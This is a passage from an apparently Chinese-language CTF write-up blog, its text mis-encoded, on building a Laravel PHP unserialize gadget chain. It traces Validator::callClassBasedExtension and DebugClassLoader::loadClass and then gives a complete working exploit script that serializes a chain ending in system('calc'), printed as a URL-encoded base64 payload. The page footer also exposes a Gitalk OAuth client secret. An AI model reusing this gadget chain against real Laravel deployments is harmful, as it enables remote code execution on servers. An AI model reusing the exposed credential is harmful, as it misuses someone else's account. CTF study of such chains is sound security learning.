<p>ä½†æ˜¯<code>PendingBroadcast</code>è¿™ä¸ªç±»æ²¡æœ‰äº†ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å¦ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„ç±»ï¼Œå¾ˆéš¾ï¼ˆè¿™é‡Œæ²¡æ‰¾åˆ°ï¼‰ã€‚<br>
çœ‹ä¸‹èƒ½å¦åˆ©ç”¨<code>callClassBasedExtension</code>æ–¹æ³•ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç”¨ä¸Šé¢çš„<code>DefaultGenerator</code>æ–¹æ³•ï¼Œå¯ä»¥æ§åˆ¶<code>$this-&gt;container-&gt;make($class)</code>çš„å€¼ï¼Œç„¶å<code>$method</code>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡<code>$callback</code>å‚æ•°æ§åˆ¶ï¼Œ<code>$parameters</code>å‚æ•°ä¹Ÿæ˜¯å¯æ§çš„</p>
<p>ä½†æ˜¯å› ä¸ºè¿™é‡Œä½¿ç”¨çš„æ•°ç»„å½¢å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾å¯ä»¥åˆ©ç”¨çš„<code>$this-&gt;container-&gt;make($class)-&gt;$method($parmeters)</code></p>
<pre><code>    /**
     * Call a class based validator extension.
     *
     * @param  string  $callback
     * @param  array   $parameters
     * @return bool
     */
    protected function callClassBasedExtension($callback, $parameters)
    {
        list($class, $method) = explode('@', $callback);

        return call_user_func_array([$this-&gt;container-&gt;make($class), $method], $parameters);
    }
</code></pre>
<p>è¿™é‡Œæ‰¾åˆ°<code>DebugClassLoader</code>çš„<code>loadClass</code>æ–¹æ³•</p>
<pre><code>public function loadClass($class)
    {
        ErrorHandler::stackErrors();

        try {
            echo &quot;loooooooadclass&quot;;
            if ($this-&gt;isFinder &amp;&amp; !isset($this-&gt;loaded[$class])) {
                $this-&gt;loaded[$class] = true;
                if ($file = $this-&gt;classLoader[0]-&gt;findFile($class)) {
                    require $file;
                }
            } else {
                echo &quot;sssssssssssucccesss&quot;;
                call_user_func($this-&gt;classLoader, $class);
                $file = false;
            }
        } catch (\Exception $e) {
            ErrorHandler::unstackErrors();

            throw $e;
        } catch (\Throwable $e) {
            ErrorHandler::unstackErrors();

            throw $e;
        }
</code></pre>
<p>ç¼–å†™exp</p>
<pre><code class="language-php">&lt;?php
namespace{
    use Prophecy\Argument\Token\ObjectStateToken;
    class Swift_KeyCache_DiskKeyCache{
        private $_keys=['fallingskies'=&gt;['fallingskies'=&gt;'fallingskies']];
        private $_path;
        public function __construct($cmd){
            $this-&gt;_path=new ObjectStateToken($cmd);
        }
    }
    echo urlencode(base64_encode(serialize(new Swift_KeyCache_DiskKeyCache(&quot;calc&quot;))));
}
namespace Prophecy\Argument\Token{
    use Illuminate\Validation\Validator;
    class ObjectStateToken{
        private $name;
        private $value;
        private $util;
        public function __construct($cmd){
            $this-&gt;name='';
            $this-&gt;value=$cmd;
            $this-&gt;util=new Validator();
        }
    }
}

namespace Illuminate\Validation{
    use Faker\DefaultGenerator;
    class Validator{
        protected $container;
        protected $extensions = [];
        public function __construct(){
            $this-&gt;extensions['y']='xxx@loadClass';
            $this-&gt;container=new DefaultGenerator();
        }
    }
}
namespace Faker{
    use Symfony\Component\Debug\DebugClassLoader;
    class DefaultGenerator
    {
        protected $default;

        public function __construct()
        {
            $this-&gt;default = new DebugClassLoader();
        }
    }
}

namespace Symfony\Component\Debug{
    class DebugClassLoader
    {

        private $classLoader;
        public function __construct()
        {
            $this-&gt;classLoader = &quot;system&quot;;
        }
    }
}
?&gt;
</code></pre>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p>https://www.anquanke.com/post/id/258264#h3-11</p>

            </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://fallingskies22.github.io/post/ctfshowlaravel-zhuan-ti/">
                  <h3 class="post-title">
                    [ctfshow]Laravelä¸“é¢˜
                  </h3>
                </a>
              </div>
            

            
              
                <div id="gitalk-container" data-aos="fade-in"></div>
              

              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>




  
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>

      var gitalk = new Gitalk({
        clientID: '1b08861b8ad19018640e',
        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
        repo: 'fallingskies22.github.io',
        owner: 'fallingskies22',
        admin: ['fallingskies22'],
        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
      })

      gitalk.render('gitalk-container')

    </script>
  

  




  </body>
</html>
